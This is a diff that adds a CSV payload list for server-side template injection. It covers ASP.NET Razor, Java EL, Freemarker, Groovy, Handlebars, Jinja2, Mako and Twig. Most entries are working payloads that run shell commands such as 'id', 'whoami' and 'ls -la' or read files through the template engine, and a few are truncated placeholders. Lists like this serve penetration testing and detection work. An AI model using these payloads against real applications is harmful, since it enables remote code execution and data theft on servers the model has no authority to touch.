@@ -1,0 +1,21 @@
+Category,Platform,Payload,Description
+Basic Injection,ASP.NET Razor,@(1+2),Simple arithmetic operation using Razor syntax
+Code Execution,ASP.NET Razor,"@{
+  // C# code
+}",Command execution using Razor
+Basic Injection,Java EL,${1+1},Simple arithmetic operation in Java EL
+Code Execution,Java EL,#{session.getAttribute('rtc').getRuntime().exec('/bin/bash -c whoami')},Code execution via Java EL
+Basic Injection,Freemarker,${3*3},Basic arithmetic in Freemarker template
+Code Execution,Freemarker,<#assign ex = 'freemarker.template.utility.Execute'?new()>${ ex('id')},Command execution using Freemarker
+File Read,Freemarker,${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(' ')},Reading files using Freemarker
+Basic Injection,Groovy,${9*9},Basic arithmetic in Groovy
+Command Execution,Groovy,${'calc.exe'.exec()},Command execution in Groovy
+Code Execution,Handlebars,"{{#with 's' as |string|}}...{{this.push 'return require(""child_process"").execSync(""ls -la"");'}}",Command execution in Handlebars template
+Basic Injection,Jinja2,{{7*7}},Basic arithmetic operation in Jinja2
+Code Execution,Jinja2,{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }},Command execution using Jinja2
+Command Execution,Mako,"<%
+import os
+x=os.popen('id').read()
+%>${x}",Command execution using Mako templates
+Basic Injection,Twig,{{7*7}},Basic arithmetic operation in Twig
+Code Execution,Twig,{{['id']|filter('system')}},Command execution in Twig
